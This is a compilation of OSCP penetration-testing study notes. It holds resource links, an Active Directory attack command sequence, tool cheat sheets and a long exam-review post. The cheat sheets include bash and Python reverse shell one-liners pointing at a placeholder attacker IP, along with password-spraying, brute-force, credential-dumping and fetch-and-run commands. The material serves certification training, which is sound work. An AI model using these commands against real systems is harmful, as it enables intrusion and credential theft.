-   [*http://sbdtools.googlecode.com/files/Nmap5%20cheatsheet%20eng%20v1.pdf*](http://sbdtools.googlecode.com/files/Nmap5%20cheatsheet%20eng%20v1.pdf)

-   [*http://www.sans.org/security-resources/sec560/misc\_tools\_sheet\_v1.pdf*](http://www.sans.org/security-resources/sec560/misc_tools_sheet_v1.pdf)

-   [*http://rmccurdy.com/scripts/Metasploit%20meterpreter%20cheat%20sheet%20reference.html*](http://rmccurdy.com/scripts/Metasploit%20meterpreter%20cheat%20sheet%20reference.html)

-   [*http://h.ackack.net/cheat-sheets/netcat*](http://h.ackack.net/cheat-sheets/netcat)

Essentials
========================================================================================================

-   Exploit-db  
    [*https://www.exploit-db.com/*](https://www.exploit-db.com/)

-   SecurityFocus - Vulnerability database  
    [*http://www.securityfocus.com/*](http://www.securityfocus.com/)

-   Vuln Hub - Vulnerable by design  
    [*https://www.vulnhub.com/*](https://www.vulnhub.com/)

-   Exploit Exercises  
    [*https://exploit-exercises.com/*](https://exploit-exercises.com/)

-   SecLists - collection of multiple types of lists used during
    security assessments. List types include usernames, passwords, URLs,
    sensitive data grep strings, fuzzing payloads  
    [*https://github.com/danielmiessler/SecLists*](https://github.com/danielmiessler/SecLists)

-   Security Tube  
    [*http://www.securitytube.net/*](http://www.securitytube.net/)

-   Metasploit Unleashed - free course on how to use Metasploit  
    [*https://www.offensive-security.com/metasploit-unleashed*](https://www.offensive-security.com/metasploit-unleashed/)*/*

-   0Day Security Enumeration Guide
    [*http://www.0daysecurity.com/penetration-testing/enumeration.html*](http://www.0daysecurity.com/penetration-testing/enumeration.html)

-   Github IO Book - Pen Testing Methodology  
    [*https://monkeysm8.gitbooks.io/pentesting-methodology/*](https://monkeysm8.gitbooks.io/pentesting-methodology/)
    
Windows Privledge Escalation
========================================================================================================

-   Fuzzy Security
    [*http://www.fuzzysecurity.com/tutorials/16.html*](http://www.fuzzysecurity.com/tutorials/16.html)
    
-   accesschk.exe
    https://technet.microsoft.com/en-us/sysinternals/bb664922

-   Windows Priv Escalation For Pen Testers
    https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/

-   Elevating Privileges to Admin and Further
    https://hackmag.com/security/elevating-privileges-to-administrative-and-further/
    
-   Transfer files to windows machines
    https://blog.netspi.com/15-ways-to-download-a-file/
    
////////////////////////////

how to solve AD machines in OSCP

nmap -sC -sV -p- <IP_ADDRESS>
-
enum4linux -a <IP_ADDRESS>
smbclient -L \\\\<IP_ADDRESS>\\
ldapsearch -x -h <IP_ADDRESS> -b "DC=example,DC=com"
-
crackmapexec smb <IP_ADDRESS> --users
rpcclient -U "" <IP_ADDRESS>
-
GetNPUsers.py <domain>/<user>@<ip_address> -no-pass -usersfile users.txt
-
GetUserSPNs.py <domain>/<user>:<password> -request
-
crackmapexec smb <IP_ADDRESS> -u users.txt -p Password123 --spray
-
psexec.py <DOMAIN>/<USER>:<PASSWORD>@<IP_ADDRESS>
-
findstr /S /I cpassword \\\\<domain_ip>\\SYSVOL\\* 
gpp-decrypt <encrypted_password>
-
GetUserSPNs.py -request <domain>/<user>:<password> -dc-ip <ip_address>
-
secretsdump.py <domain>/<admin>@<dc_ip>
-
**Tools to Use:**
Impacket Suite: Provides a set of Python classes for working with network protocols.
**BloodHound:** Great for identifying attack paths and privilege escalation opportunities in AD environments.
**CrackMapExec:** Versatile tool for enumerating, spraying passwords, and exploiting AD machines.
**Mimikatz:** Tool for dumping credentials and tickets from memory once you have sufficient privileges.

////////////////////////////

OSCP Exam Format
The PWK course prepares for the OSCP exam, a 24-hour exam which a member of OffSec proctors to ensure you follow exam requirements. The exam consists of two parts:

Traditional penetration testing: This part consists of three independent targets that require two steps to compromise. You are awarded 20 points per successfully compromised machine, split into 10 points for low-privilege access and 10 points for privilege escalation, for a total of 60 points. You prove success by taking screenshots and submitting a proof file (local.txt or proof.txt) to your control panel.
Active directory testing: This part includes two client machines and one domain controller. To achieve 40 points, you must fully compromise the domain controller. No partial points are awarded.
The points awarded during the exam are not the only ones on offer. Before starting the exam, you can receive ten bonus points by submitting at least 80% of the correct solutions for every module's lab in the PWK course and 30 correct proof.txt hashes for 30 challenge labs. 

OSCP Exam Report
Upon completing the exam, you will have 24 hours to write a professional report describing your exploitation process for each target. 

This report must document your attacks, including all steps, commands issued, and console output. It should be thorough enough that a third-party reader could replicate your attacks step-by-step.

To pass the exam, you must achieve a minimum score of 70 points, provide sufficient documentation, and follow OffSec’s strict exam requirements regarding exploit code, exam proofs, and exam restrictions.

Failing the OSCP exam will require you to pay for a retake. This costs $249 unless you are signed up for one of OffSec’s annual subscription plans (Learn One or Learn Unlimited).

Now you know the basics. Let’s jump into what you can expect on the OSCP exam.

OSCP Exam Guide: What Can I Expect?
The PWK course material is extensive. It includes everything from creating bash scripts to performing Active Directory and buffer overflows. However, much of this material is not tested during the OSCP exam. 

Knowing what material from the PWK course you will be tested on is important before sitting your OSCP exam. This will allow you to dedicate your time to perfecting these skills, giving you the best chance of passing the exam. 

Let’s look at what is and is not included in the exam.

What is NOT in the OSCP Exam
Here are topics taught in the PWK course that are not included in the OSCP exam.

Bash and Python Scripting
The PWK course includes sections on the basics of Bash and Python scripting. You’ll not be tested on this knowledge specifically, so don’t worry about memorizing syntax, listing language features, or creating scripts from scratch. 

Open Source Intelligence (OSINT)
The PWK course has an entire section on information gathering. This is a vital phase during a real-world penetration test, but in the OSCP exam, you don’t need to gather public information about your targets. You only need to use tools like Nmap to find open ports, services, and vulnerabilities. 

Buffer Overflows
The PWK teaches how to perform buffer overflow attacks against vulnerable Windows and Linux applications. This is valuable knowledge, but it’s no longer needed during your OSCP exam. The Active Directory portion of the OSCP exam has replaced this previous requirement.

Poisoning and Spoofing Attacks
The new PWK course is heavily focused on testing Active Directory environments. You’ll learn how to enumerate and attack Active Directory using various techniques, including how to use tools like Responder to perform poisoning and spoofing attacks. These attacks are common in real-world internal pen testing but are not tested on the OSCP exam. In fact, they are banned. 

Anti-Virus Evasion and Persistence
During the PWK course, you’ll be exposed to material on anti-virus evasion and establishing persistence on compromised machines. These are great topics to know, but they are not tested on the OSCP exam. These topics often are more aligned with red teaming than penetration testing.

What IS in the OSCP Exam
Here’s the course material you should master to prepare for your OSCP exam.

Privilege Escalation
To earn all the points offered during your OSCP exam, you must perform privilege escalation on the machines you target. Escalating your privileges accounts for half the points available, so mastering Windows and Linux privilege escalation is critical for success. 

Report Writing
Although not a traditional “hacker” skill, you must be able to structure and write a complete penetration test report. This is a skill you’ll need if you want to become a real penetration tester and one you must perform to pass the OSCP exam. Once you complete your exam, you must submit a detailed report that details your findings and allows a reasonably skilled third party to reproduce your testing step-by-step.

Web Attacks
Although not strictly a web app penetration test exam, you must often exploit at least one web exploit to gain access to a machine, though not always. This is typically a web application vulnerability like SQL injection, cross-site scripting, or broken access control. Ensure you know how to enumerate and exploit vulnerable web applications before your test.

Enumeration
A fundamental skill to master to pass the OSCP exam is enumeration. Everyone who has ever taken the OSCP will lecture you on the importance of performing enumeration to find all possible attack paths, vulnerabilities, and missing security controls. The main difference between passing or failing your OSCP is learning to perform thorough enumeration.

Enumeration is even more important now that most of the exam focuses on Active Directory. Ensure you learn to enumerate and exploit common Active Directory vulnerabilities, be comfortable using tools like Bloodhound and Mimikatz, and perform attacks like Kerberoasting and pass the hash.

Public Exploits
During your OSCP exam, you must use public exploits to hack machines. These exploits are usually found in places like GitHub or Exploit-DB and require tweaking to match your target machine. Learning basic scripting skills will be helpful, but more importantly, practice finding, tweaking, and using these exploits against vulnerable machines on hacking platforms.

Should I Prepare Before Taking the PWK Course (OSCP Requirements)?
Preparing yourself before starting the PWK course is a good idea. At a minimum, OffSec recommends a solid understanding of networking, Windows and Linux administration skills, and familiarity with Bash or Python scripting. 

However, most people who have passed the OSCP believe you should acquire more skills before tackling the course. 

Cyber Security Foundational Knowledge
A strong foundation in IT, networking, and cyber security is essential. You should know how to troubleshoot IT issues, describe common network ports and protocols, and discuss common defenses used to protect against attacks. 

You better have this knowledge locked down before starting the PWK course material. 

Acquiring these foundational skills and knowledge is described in depth in our article, Best Way to Learn Cyber Security. The following courses also cover this material.


**oscp important commands and tools:**

Information Gathering and Enumeration

**Nmap (Network Scanning)**

Basic Scan (to find open ports):
bash
Copy code
nmap -sS -Pn <target_IP>
Version Detection & Service Enumeration:
bash
Copy code
nmap -sV -sC <target_IP>
Aggressive Scan (includes OS detection, script scanning, etc.):
bash
Copy code
nmap -A <target_IP>
Scan specific ports:
bash
Copy code
nmap -p <port_number> <target_IP>


**Netcat (nc) - Banner Grabbing & Reverse Shell**

Basic port scan:
bash
Copy code
nc -zv <target_IP> <port_range>
Open a listener for reverse shell:
bash
Copy code
nc -lvnp <port>
Connect to a service:
bash
Copy code
nc <target_IP> <port>


**Gobuster / Dirb (Directory and File Enumeration)**

Gobuster (faster enumeration):
bash
Copy code
gobuster dir -u http://<target_IP> -w /path/to/wordlist.txt


**Dirb (slower but effective):**
bash
Copy code
dirb http://<target_IP> /path/to/wordlist.txt


**Nikto (Web Vulnerability Scanner)**

Basic scan to find vulnerabilities in a web server:
bash
Copy code
nikto -h http://<target_IP>

--
**Exploitation
Metasploit Framework**

Search for exploits:
bash
Copy code
search <service_name>
Set exploit and payload:
bash
Copy code
use <exploit_name>
set RHOST <target_IP>
set LHOST <your_IP>
exploit
Metasploit should only be used sparingly in OSCP (e.g., one machine during the exam).

**Searchsploit (Exploit-DB)
Search for public exploits:**

bash
Copy code
searchsploit <service/software>
Copy exploit to current directory:
bash
Copy code
searchsploit -m <exploit_id>

**Manual Exploitation:**

For the OSCP exam, rely on manual exploitation as much as possible:
Download exploit code from Exploit-DB.
Modify the code if necessary (adjust IP addresses, ports, shell commands, etc.).

**Post Exploitation and Privilege Escalation
LinPEAS (Linux Privilege Escalation Automation Script)**

Run LinPEAS to enumerate for potential privilege escalation vectors:
bash
Copy code
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
LinEnum (Linux Privilege Escalation):

Use LinEnum to find misconfigurations or potential privilege escalation methods:
bash
Copy code
wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
chmod +x LinEnum.sh
./LinEnum.sh
GTFOBins (Linux Binary Exploits)

If you find a vulnerable SUID binary or restricted shell, you can look it up on GTFOBins to see if it can be exploited for privilege escalation.

----
**Windows Privilege Escalation Tools:**

WinPEAS:

bash
Copy code
Invoke-WebRequest -Uri https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASx64.exe -OutFile winPEASx64.exe
./winPEASx64.exe


PowerUp (Windows Privilege Escalation via PowerShell):

bash
Copy code
powershell -exec bypass
Import-Module ./PowerUp.ps1
Invoke-AllChecks
Sudo and SUID Checks (for Linux Privilege Escalation)

Check for SUID binaries:
bash
Copy code
find / -perm -4000 2>/dev/null
Check sudo privileges:
bash
Copy code
sudo -l

**Cron Jobs (for Linux Privilege Escalation)**

Check for misconfigured or writable cron jobs:
bash
Copy code
cat /etc/crontab


-------------
**File Transfers
Python HTTP Server (for file transfer)**

Host a Python server to transfer files:
bash
Copy code
python3 -m http.server 8080
Download files with wget:
bash
Copy code
wget http://<attacker_IP>:8080/<file>
Netcat (File Transfer)

Transfer files using Netcat:
Send file to the victim:
bash
Copy code
nc -lvnp 4444 < <file_name>
Receive file on the victim machine:
bash
Copy code
nc <attacker_IP> 4444 > <file_name>
Reverse Shells
Bash Reverse Shell

bash
Copy code
bash -i >& /dev/tcp/<attacker_IP>/<port> 0>&1
Python Reverse Shell

bash
Copy code
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<attacker_IP>",<port>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
Post Exploitation (Privilege Escalation Techniques)

--
**SUID Privilege Escalation:**

If you find any SUID files with elevated privileges, you can exploit them to gain root access.
bash
Copy code
find / -perm /4000 2>/dev/null

**Kernel Exploits:**

Use searchsploit or the manual search to find kernel vulnerabilities that can lead to privilege escalation.
Important OSCP Tips
Focus on Manual Exploitation: Avoid over-relying on Metasploit or automated tools. Manual exploitation techniques will be critical.
Document Everything: Take notes and screenshots of each step for reporting.
Time Management: Balance time between machines. If you're stuck on one, move to the next.
Privilege Escalation: Thorough enumeration is key. Use LinPEAS, WinPEAS, and manual checks to find possible privilege escalation paths.
Avoid Forbidden Techniques: Do not brute-force services like SSH, and avoid denial-of-service attacks.
By mastering these commands and tools, you'll be well-prepared for the OSCP exam while staying within the exam's guidelines of manual exploitation and proper techniques.

///////////////

Here are some important commands and tools that are frequently used during the OSCP (Offensive Security Certified Professional) exam:
--

Information Gathering and Scanning
Nmap (Network Mapper)

Scan for open ports and services:
bash

nmap -sC -sV -oN nmap_scan <target_IP>
Aggressive scan with OS detection:
bash

nmap -A <target_IP>
Netcat (nc)

--
**Open a listener:**

bash

nc -lvnp <port>
Connect to a service:
bash

nc <target_IP> <port>

--

**Gobuster / Dirb (Directory Bruteforcing)**

Gobuster for directories:
bash

gobuster dir -u http://<target_IP> -w /path/to/wordlist.txt
Dirb basic scan:
bash

dirb http://<target_IP>

--

**Nikto (Web Vulnerability Scanner)**
Basic web scan:
bash

nikto -h http://<target_IP>

==

**Exploitation Tools**
**Metasploit Framework**

Start Metasploit:
bash

msfconsole
Search for an exploit:
bash

search <service_name>
Set payload and target:
bash

use <exploit_name>
set RHOST <target_IP>
set LHOST <your_IP>
exploit
Searchsploit (Exploit Database)

--

**Search for an exploit:**
bash

searchsploit <service/software_name>


-----------------------------------
**Password Cracking**


1. **Hydra (Brute-force Login)**


**Brute force SSH login:** X [not allwed in oscp ]
bash

hydra -l <username> -P <password_list> ssh://<target_IP>

-
Brute force HTTP forms:
bash

hydra -L <user_list> -P <password_list> <target_IP> http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect"

**2. John the Ripper (Password Cracking)**

Crack hashes:
bash

john --wordlist=<wordlist> <hash_file>

**3. Hashcat (Password Cracking)**

Crack hashes using a wordlist:
bash

hashcat -m <hash_type> <hash_file> <wordlist>
-------------------------------------------------------

**File Transfers**
**1. Python HTTP Server**

Start a Python HTTP server for file transfer:
bash

python3 -m http.server 8080

**Download a file using wget:**
bash

wget http://<your_IP>:8080/<filename>

**2. Netcat (File Transfer)**

Send a file to a remote system:
bash

nc -lvp 4444 < <file_name>
Receive a file:
bash

nc <your_IP> 4444 > <file_name>

------------------------------------------

**Privilege Escalation**
**1. Linux Privilege Escalation Tools**

LinEnum:
bash

wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
chmod +x LinEnum.sh
./LinEnum.sh
LinPEAS:
bash

wget https://github.com/carlospolop/PEASS-ng/releases/download/20230424/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh

**2. Windows Privilege Escalation Tools**

WinPEAS:
bash

Invoke-WebRequest -Uri https://github.com/carlospolop/PEASS-ng/releases/download/20230424/winPEASx64.exe -OutFile winPEASx64.exe
PowerUp (Windows PrivEsc via PowerShell):
powershell

powershell -exec bypass
Import-Module ./PowerUp.ps1
Invoke-AllChecks

-----------------------------------

**Post Exploitation**
**1. Chisel (Port Forwarding)**

Start server on attacking machine:
bash

./chisel server -p <port> --reverse

Start client on victim machine (reverse tunnel):
bash

./chisel client <your_IP>:<port> R:<local_port>:<target_IP>:<target_port>

**2. SSH (Port Forwarding)**

Local port forwarding:
bash

ssh -L <local_port>:<target_IP>:<target_port> <user>@<target_IP>

-------------------------------------

**File Enumeration**

**1. Strings (Extract printable strings)**

Analyze binary or file for strings:
bash

strings <file>

**2. Exiftool (Metadata Extraction)**

Extract metadata from files:
bash

exiftool <file>

-----------------------------------

**Miscellaneous**

**Tcpdump (Network Sniffing)**

Capture packets:
bash

**tcpdump -i <interface> -w <capture_file>**
Netstat (Network Connections)

List open connections and listening services:
bash

netstat -antp

-----------------------------------

**Important OSCP Tips**
Manual Exploitation: Avoid over-reliance on Metasploit; use manual methods whenever possible.
Persistence: After getting a foothold, focus on privilege escalation and lateral movement.
Documentation: Take thorough notes and screenshots for the exam report.
These commands and tools will cover a wide range of tasks, from reconnaissance to exploitation and post-exploitation, crucial for succeeding in the OSCP exam.

/////////////////
/n
# OSCP
OSCP Notes
Vvi 1
https://help.offsec.com/hc/en-us/articles/8586537411988-Getting-started-with-Essential-Learning-Paths  
=
 
Vvi 2
https://help.offsec.com/hc/en-us/articles/23381957082900-How-to-run-Windows-script-in-Windows-Powershell

-
 
Vvi 3 
https://help.offsec.com/hc/en-us/articles/360050299352-Proctoring-Tool-Manual
- 
vvi 4 
oscp vid
=
 
Vvi 5
https://www.udemy.com/course/windows-privilege-escalation/learn/lecture/18153194#overview
**window prevesc**
-
vvi6 
https://www.udemy.com/course/linux-privilege-escalation/learn/lecture/16312506?start=15#overview  
**Linux prevesc** 
= 
vvi7 
https://github.com/Purp1eW0lf/HackTheBoxWriteups/blob/master/OSCP%20Lab%20%26%20Exam%20Review%20and%20Tips.md  
=
vvi8
IppSec's videos](
https://www.youtube.com/channel/UCa6eh7gCkpPo5XXUDfygQQA  
=
vvi8
https://rana-khalil.gitbook.io/hack-the-box-oscp-preparation/ 
=
vvi9 
Labs name list in oscp exam
•	Offensive Security **PWK labs**: These labs are accessed after the lab access starts and include subnets and vulnerable machines. 
•	**TryHackMe**: This resource includes labs such as Active Directory Basics, Post-Exploitation Basics, and Vulnnet Roasted. 
•	**HackTheBox**: This resource includes labs such as Forest, Active, Fuse, Cascade, Monteverde, Resolute, Arkham, Mantis, APT, Dante, Offshore, RastaLabs, and Cybernetics. 
•	**HackTheBox** Academy: This resource includes labs such as Introduction to Active Directory, ActiveDirectory LDAP, ActiveDirectory Powerview, ActiveDirectory BloodHound, and ActiveDirectory Enumeration & Attacks. 
•	**Proving Grounds**: This resource includes labs such as PG-Practice, Hutch, Heist, and Vault. 
•	**NetSecFocus Trophy Room**: This resource includes lists of boxes to help build practical skills and brush up on weak points. 
•	**TJ_Null's list of Hack the Box OSCP-like VMs**: This list of VMs is available on GitHub and GitBook. 

=
https://github.com/infosec-harshalkukade/OSCP
===================================================
# OSCP Lab & Exam Review and Tips
Written September 2020

TL;DR: commit to preparation. Complete every OSCP-related resource and you will pass.

## Intro

So I want this to hopefully be a bit more than the obligatory 'I passed the OSCP' , and offer some advice for those who want to take the exam as well as give my opinions of the course. It's a lengthy post, with advice from beginning to end of an OSCP path.

The topics we're going to go through:

1. [OSCP preparation](#Pre-OSCP-preparation)
2. [Purchasing the OSCP](#Purchasing-the-OSCP)
3. [Coursework](#OSCP-Coursework)
4. [Buffer Overflows](#Buffer-Overflow) X
5. [Lab Report](#OSCP-Lab-report)
6. [Labs themselves](#OSCP-Labs)
7. [Pre exam prep](#pre-exam)
8. [Exam itself](#exam)
9. [Exam reporting](#post-exam)
10. [Post exam](#And-after-the-OSCP-Exam)


## Pre OSCP preparation

Before you pay for the OSCP labs, I would recommend that you take up the following free (or cheap) resources:

* [Over the wire](**https://overthewire.org/wargames/**) - specifically Bandit and Natas. Don't worry about the others, as I found that they weren't as relevant for the OSCP
* [Under the wire](**https://www.underthewire.tech**) - these challenges are to get you more comfortable with using Windows Powershell. I had zero experience with Powershell, and these challenges really helped give me a basic understanding.
* [The Cyber Mentor's Courses](**https://www.thecybermentor.com/**) - take every single course this man has to offer. His first Udemy class and his YouTube videos are brilliant courses for absolute beginners, and his privilege escalation courses were incredibly helpful in the OSCP labs. I didn't take Tib3rius' privilege escalation course ( I have taken some of his other things) but he is also a great resource that you should learn from
* [Hack the Box](**https://www.hackthebox.eu/**) - HTB is the recommended resource to get some hacking practice before you fork over a significant amount of money for the OSCP course.
* [ippsec -hk] TJ Null has [a list of oscp-like machines in HTB machines](https://docs.google.com/spreadsheets/d/1dwSMIAPIam0PuRBkCiDI88pU3yzrqqHkDtBngUHNCw8/edit#gid=1839402159).What I will say is, a third of the machines on the list on the link are harder than what you'll find in the labs or the exam. Equally, there are four machines that have literally no place being on that list as they were too CTFy or difficult compared to what you'll find in your OSCP course. Take really detailed, thorough, methodical notes here. Practice creating detailed writeups so you'll be well-prepared for the reporting requirements for the OSCP. You can find my HTB writeups here if you're interested.
* [Try Hack Me](https://tryhackme.com) - I don't have too much to say here other than if you're an absolute beginner, and you're struggling on Hack the Box, switch to Try Hack Me and do a couple of free machines. Try Hack Me comes with hints/answers as you go, and the hand-holding is nice....but you need to get away from this mentality as soon as possible as the OSCP does not hold your hand at all.
* Writeups - Perhaps conflicting somewhat with my previous statement, I really recommend reading writeups for machines. Sometimes if you're painfully stuck on a machine, read a writeup. Some people say you should stew and suffer, but honestly there were times in Hack the Box that if I didn't read the writeup I NEVER would have learned something. Moreover, once you've learned it you will never get stuck on that kind of obstacle again. Writeups - as long as you don't turn to them straight away - are an invaluable tool that teach you how others' approach a machine. There are of course [IppSec's videos](https://www.youtube.com/channel/UCa6eh7gCkpPo5XXUDfygQQA) to learn from, which I recommend as he offers you a lesson in mentality as much as he offers you the answers. [Rana Khalil's](https://rana-khalil.gitbook.io/hack-the-box-oscp-preparation/) gitbook is dedicated to OSCP-like Hack the Box writeups, and I found Rana's appraoch and explanations to be enlightening as I went through my own preperation. 
* Vulnhub - just my subjective take on the matter, but I didn't find a single Vulnhub machine that I enjoyed. HTB or Try Hack Me are better choices for you to spend time on.
* Note Taking - I used [Gitbook](https://www.gitbook.com/) for my note taking on Hack the Box and the OSCP labs. It's like google docs, in that it 'backs up' externally to your computer so you don't lose any notes if your VM crashes (which will happen plenty). Gitbook also has a good search functionality, so if you see port 1433 in the OSCP labs and think that you encountered that before it's as simple as searching for it amidst your notes. I did find that Gitbook wasn't that reliable for images (it seemed like some of mine would disappear after a few days) so maybe export the notes as PDFs if you're attached to keeping your images.

## Purchasing the OSCP

When you're ready to purchase your OSCP course, there are a number of options for what you can pay for. I'm not going to dwell on this for too long but what I will say is this: if you have children, intense work commitments, or an unforgiving significant other - choose the 90 day option. If you don't have children, if your workplace is understanding, and if your SO is forgiving - choose the 60 day option.

OffSec can take up to a fortnight to accept your payment and send you the course details, so please do keep this in mind when it comes to scheduling and timing. I didn't realise there would be such a gap in time, and ended up losing losing a week of time I had set aside for the course.

## OSCP Coursework

For the majority of the coursework, I was frustrated. It felt like 800 pages of content that was outdated and time-consuming. Looking back now, though, I see that OffSec weren't trying to teach me answers but were in fact trying to foster a mentality in how to approach tasks. The content isn't all bad either, as there was some techniques and tips that I was genuinely impressed with and used in the exams.

There may be some who say that completing the coursework is not worth the five points you receive towards the final exam. I say those people are either overconfident in their abilities or misunderstand simple math. As there's little we can do for the former, let's examine the latter: the OSCP Exam comes in the form of five machines, with two 25 point machines, two 20 point machines, and one ten point machine. One of those machines is a buffer overflow machine (which is a guaranteed 25 points). When you add up a combination of a handful of these machines, you can start to see how five points can be the difference between a pass and fail. Moreover, let's just say you pass with what you think is 73 points but OffSec deduct four points because of sloppy reporting. That's a fail. Whereas those extra five points you would have received from the coursework would have pushed you into a more comfortable passing mark.

In essence, the coursework is dull and painful for 90%. But the 10% of interesting stuff, plus the five points, makes it undeniably worth it. Please do the coursework. I would recommend banging out the course report as soon and quick as you can. I spent eight days, giving fifteen hours a day just burning through the course so I could get it out of the way. I will assume you're more intelligent than I am and will get through the coursework much faster than I did.

## Buffer Overflow

The buffer overflow section in OffSec's course pdf is awful. It was my least favourite part of the whole course, and it kept coming up again and again throughout the 800 pages. They don't explain it well from the beginning and that confusion persists as you go through the BOF sections. It's the only part of the entire course that I was actually frustrated I had paid OffSec this much money.

Fortunately for me (and now for you) I had gathered some resources before starting the labs and had already perfected my BOF skills. I would recommend you first follow Heath Adams' Cyber Mentor BOF guide. He teaches the part-manual, part-automated method, and helps you understand some of the theory. Once you've completed this, then move onto Tib3rius' BOF practice room on Try Hack me. It teaches you the mostly automated method for a BOF, and it is the easiest, quickest way by far. Heath's guide is necessary, as he teaches you a middle-way that makes sure you wouldn't be lost if your automated tools stopped working. OffSec's method is maybe too manual. And I understand that they want to impart the lesson of doing things manually, but for a topic as confusing as BOF it's better to use Tib3rius' automated BOF methods that are allowed in the exam.

OffSec is gonna have you working those bad characters out manually, eyeballing each one in tiny font six. And you're gonna do it, as that's the requirement for passing the coursework. And you're gonna fuck up one of those characters and your exploit won't work, because human error is bound to kick in when you're doing with that many slashes, x's and 0s. All I can say is sigh deeply to yourself and do it OffSec's way for the coursework. Come exam time, Tib3rius' way is the way to go.

## OSCP Lab Report

The other requirement to get those five points is to complete ten machines in the OSCP lab, and ensure that you have documented these in a report. I don't have much to say about this either, as it's straightforward and you would be doing yourself a disservice if you didn't create ten writeups of machines you're going to hack anyway to get yourself points towards the exam.

For both the Lab report and Exam I used more of a 'boot to root' style of writeup. I found OffSec's example report to be too confusing to actually follow per machine. It makes sense in a real world engagement to produce a report that looks at things per vulnerablity (not per host). However this isn't the real world, so feel free to use a walkthrough style for your reporting too.

## OSCP Labs

The labs are around sixty vulnerable machines split across a handful of networks. You will have immediate access to around forty machines, with the remaining machines hidden in those secret networks. I completed every single machine, as I saw these as 'practice exams'. Therefore my logic was completing every practice exam meant I would be in better stead for the real deal.

I want to address two major criticisms I have about the OSCP labs.

First is to OffSec and it's about dependencies. Some of the machines require you to have rooted other machines, and stolen passwords or files from those. Now there's nothing wrong with that, but please do let people know that these are dependent machines. I shouldn’t have to go onto the forums - where spoilers are everywhere - just to try and workout if a machine I'd spent all day on has a dependency I don't know about. To me, it would be as easy as calling a host 'Topcat-Dpndt' so students know.

Second criticism are to the people who say not to bother with the secret networks in the labs, or bother with the Active Directory machines in the labs.. Their justification for this is that "SSH pivoting/Active Directory isn't relevant for the exam". Now this is true in part, your test will not feature dependent machines. But your exam may feature some things that require AD knowledge, or require you to forward an internal service from a machine back to your kali for privilege escalation. Moreover, the secret networks are where some of the really hard privilege escalations are. Everyone goes on about the 'Big Four' machines and okay those were hard, but man some of the techniques I learned in the secret networks were incredible. Some people have a goal of 'complete 30 machines, complete 55 machines' etc etc. I don't know what their motivation is to not do all the machines in the lab - maybe they have time constraints, or have confidence in their abilities - but all I know is that doing every single machine benefited me hugely during the exam.

I wanted to critique the Student Admins, who are on Helpdesk for any tech issues you're having as well as to give you pointers on machines. I only had two experiences with student admins, and whilst they were both nice people I think that English was not their first language and as a result their advice (and the conversation in general) was difficult. When someone is trying to give you a cryptic hint to a machine, and their command of English isn't that strong, it's not gonna go well for you. However I am reserving this as an actual thing OffSec should improve as I don't see how they could. They could hire student admins who have demonstrably high-level fluency in English, but maybe they do and I just got unlucky the two times I communicated with them? At any rate, I would gladly sign up to be a Student Admin as I would enjoy advising fellow students on hints and tips throughout their labs.

## Pre Exam

Book your exam date as early as you can, as the slots fill up quickly. I know it's difficult to know what life will be like two or three months time, but it's necessary I'm afraid. You don't want to leave a big gap between finishing the labs and doing your exam.

A fortnight before your exam, email OffSec and ask for a test session for your equipment. As the exam is proctored (someone watches you via webcam and monitors the activity on your host OS' screen) you need to test and make sure all the software works. The last thing you want on exam day is for a tech problem to eat into your time or have your exam cancelled. My host OS was Kubuntu, and I used [this camera](https://www.ebay.co.uk/itm/184359371428) which said it worked for Linux systems, so I definitely wanted to test my system and make sure it all worked well.

Please keep hardware requirements in mind too. I'd recommend you have at least 16gigs of ram, as you won't just be running your VM but you'll be running the proctoring software too. You'll also want good ram, and a computer that won't overheat, as you'll be running the machine for long periods of time and it will be doing intense work. The last thing you want is for your computer to die mid exam!

## Exam

I won't go into detail here, as the OSCP exams are not to be discussed at length.

My approach to the OSCP was a commitment to preparation. I wanted to make sure that no matter what was thrown at me, I had experience in it and wouldn't be faced with a service or configuration that I'd never seen. This paid off, as within four hours I had gained enough points to pass, and after eight hours I asked the proctor terminate my VPN connection.

I would strongly advise you take perfect screenshots and okay-ish notes whilst you're hacking the machines in the exam. This will make the reporting requirement easier.

Keep two copies of the Kali exam image, and use snapshots just in case. The last thing you want is for your VM to break and not restart.

## Post-Exam

After you've rooted your exam machines, you need to write your report and submit it to OffSec. Be meticulous here. Don't just screenshot what you did, but also include the commands you ran. I want you to write that report like your significant other, your grandma, your dog is gonna pick up that report and follow each page so they can re-create every step to root. This doesn't mean you're going to write the report like its a 'explain like I'm five'. Rather, you're going to write the report that is replicable and clear.

Once you've written your exam report, you're going to send that and your coursework and lab reports to OffSec. OffSec have a dedicated page for their exam guide, focus on section three. It is entirely possible to root every single machine, complete every single coursework and lab requirement, send off your reports and fail the exam. Why? Because OffSec's rules for exam submission are incredibly punitive, and require you to zip reports, password protect them, upload them, copy links and email them - it's a highly-choreographed dance that OffSec has us do post-exam, and they don't explain it well.

This is an area I am hugely critical of OffSec for. They don't need to fail a person who rooted every machine and completed all course tasks just because they sent 'exam report.pdf'. I understand they have thousands of students, and can't chase them all up to meet administrative requirements. But, OffSec, that IS all you'd be failing someone for: administrative requirements. In real life, I have not found that a client will refuse payment because of a report name, or will reject an entire report because they had trouble unlocking the password-protected file.

This is an area I would also like to OffSec improve on, as they have strict rules but do not explain it well. For example, does the coursework report and ten-machine-lab report get submitted in two separate reports, along with your exam report, or do you condense those two into one course/lab report and send that off with your exam report? I don't really know. I did the latter. It seemed to be okay for me as I passed, but greater clarity from OffSec would be even better.

## And after the OSCP Exam

OffSec state it may take thirty days to get results, but from what I've seen most people get their results within five days. I imagine a weekend submission may take a little bit longer. I did my exam early in the weekday and received my results midday two days later. The certificate does seem to arrive a little bit more erratically, due to COVID 19, as I haven't worked out a pattern of who receives theirs and when. I passed less than a week ago, so I won't see mine for maybe a little bit more.
/////////////
OSCP Syllabus
The updated course includes 23 learning modules, which include:

General Course Introduction
Introduction to Cybersecurity
Effective Learning Strategies
Report Writing for Penetration Testers
Information Gathering
